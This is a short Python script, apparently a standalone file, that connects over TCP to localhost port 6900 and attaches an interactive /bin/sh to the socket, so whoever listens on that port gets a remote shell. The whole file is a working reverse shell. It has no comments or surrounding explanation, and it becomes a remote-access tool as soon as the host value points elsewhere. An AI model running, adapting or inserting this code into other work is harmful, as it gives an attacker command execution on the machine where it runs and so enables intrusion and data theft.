#!/usr/bin/python3

import socket 
import subprocess 

HOST = 'localhost'
PORT = 6900

tcp = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
tcp.connect((HOST,PORT))

p = subprocess.Popen(['/bin/sh','-i'],shell=True,stdin=tcp.fileno(),stdout=tcp.fileno(),stderr=tcp.fileno())

p.wait()

tcp.close()

p.kill()
